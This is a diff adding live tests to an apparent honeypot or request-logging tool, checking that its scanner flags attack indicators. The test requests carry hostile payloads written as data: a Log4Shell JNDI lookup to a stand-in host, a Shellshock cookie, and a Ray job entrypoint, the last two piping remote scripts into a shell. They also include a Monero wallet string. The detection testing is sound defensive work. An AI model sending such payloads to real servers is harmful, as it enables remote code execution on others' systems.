@@ -23,6 +23,11 @@ from mirage_crawl.server import build_app, start_sites  # noqa: E402
 
 failures: list[str] = []
 
+WALLET = (
+    "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgz"
+    "YnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD"
+)
+
 
 def check(name: str, condition: bool, detail: str = "") -> None:
     print(f"  {'PASS' if condition else 'FAIL'}  {name}" + (f"  ({detail})" if detail and not condition else ""))
@@ -103,6 +108,14 @@ async def test_live() -> None:
         ray = b'{"entrypoint":"curl http://45.9.148.99/x | sh"}'
         await raw(port, b"POST /api/jobs/ HTTP/1.1\r\nHost: x\r\nConnection: close\r\n"
                         b"Content-Length: %d\r\n\r\n%s" % (len(ray), ray))
+        await raw(port, b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: ${${lower:j}ndi:ldap://evil.test/a}\r\n"
+                        b"Connection: close\r\n\r\n")
+        await raw(port, b"GET /public/ HTTP/1.1\r\nHost: x\r\n"
+                        b"User-Agent: Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)\r\n"
+                        b"Referer: http://docs.test.invalid/docs/\r\nConnection: close\r\n\r\n")
+        await raw(port, b"GET /docs/?w=" + WALLET.encode() + b" HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
+        await raw(port, b"GET /cgi-bin/status HTTP/1.1\r\nHost: x\r\n"
+                        b"Cookie: () { :; }; /bin/bash -c 'curl http://198.51.100.7/s | sh'\r\nConnection: close\r\n\r\n")
         await raw(cfg.front_socket, b"GET /x HTTP/1.1\r\nX-Forwarded-For: 5.5.5.5\r\n"
                                     b"X-Mirage-JA4: t13_x_y\r\nHost: x\r\nConnection: close\r\n\r\n")
 
@@ -139,6 +152,31 @@ async def test_live() -> None:
               bool(hunts) and hunts[0]["body_sha256"] == hashlib.sha256(ray).hexdigest(), str(hunts[:1]))
         check("hunt and request events share a request id",
               bool(hunts) and hunts[0]["rid"] == reqs["/api/jobs/"]["rid"])
+
+        print("\nscan every request (live)")
+        log4j = reqs.get("/")
+        found = (log4j or {}).get("indicators") or {}
+        check("log4shell in a User-Agent on / is found", found.get("jndi") == ["${jndi:ldap://evil.test/a}"], str(found))
+        check("indicator location recorded", "header:User-Agent" in (log4j or {}).get("indicator_locations", []),
+              str((log4j or {}).get("indicator_locations")))
+        crawler = reqs.get("/public/")
+        check("crawler UA info URL and own-site Referer are not indicators",
+              bool(crawler) and crawler.get("indicators") is None, str(crawler and crawler.get("indicators")))
+        wallet = reqs.get("/docs/")
+        check("wallet in a query on an ordinary page is found",
+              bool(wallet) and (wallet.get("indicators") or {}).get("wallets", {}).get("monero") == [WALLET])
+        shock = reqs.get("/cgi-bin/status")
+        shock_found = (shock or {}).get("indicators") or {}
+        check("shellshock in a Cookie is found", shock_found.get("shellshock") is True, str(shock_found))
+        check("URL inside a header payload is kept", any("198.51.100.7" in u for u in shock_found.get("urls", [])))
+
+        from mirage_crawl.classify import build_profiles
+        profiles = build_profiles(cfg.log_dir)
+        holders = [p for p in profiles.values() if p.wallets.get("monero")]
+        check("profile collects wallets from any request", bool(holders))
+        check("profile records exploit markers",
+              any("log4shell" in p.exploits for p in profiles.values())
+              and any("shellshock" in p.exploits for p in profiles.values()))
 
         front = reqs.get("/x")
         check("front's injected headers are not in the logged header list",
